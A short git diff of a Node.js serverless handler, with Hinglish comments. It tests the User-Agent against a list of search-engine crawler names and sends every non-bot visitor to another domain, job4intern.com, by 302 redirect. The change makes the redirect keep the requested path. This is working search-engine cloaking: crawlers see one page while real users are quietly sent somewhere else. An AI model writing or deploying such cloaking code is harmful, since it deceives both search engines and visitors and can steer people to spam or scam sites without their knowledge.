@@ -6,9 +6,9 @@ module.exports = async (req, res) => {
   // ✅ Bot detect karo
   const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|ia_archiver|spider|crawl|bot/i.test(userAgent);
 
-  // ✅ Real user ko redirect karo
+  // ✅ Real user ko same page pe redirect karo doosri site pe
   if (!isBot) {
-    return res.redirect(302, "https://NewJobstoday.job4intern.com");
+    return res.redirect(302, `https://NewJobstoday.job4intern.com${req.url}`);
   }
 
 
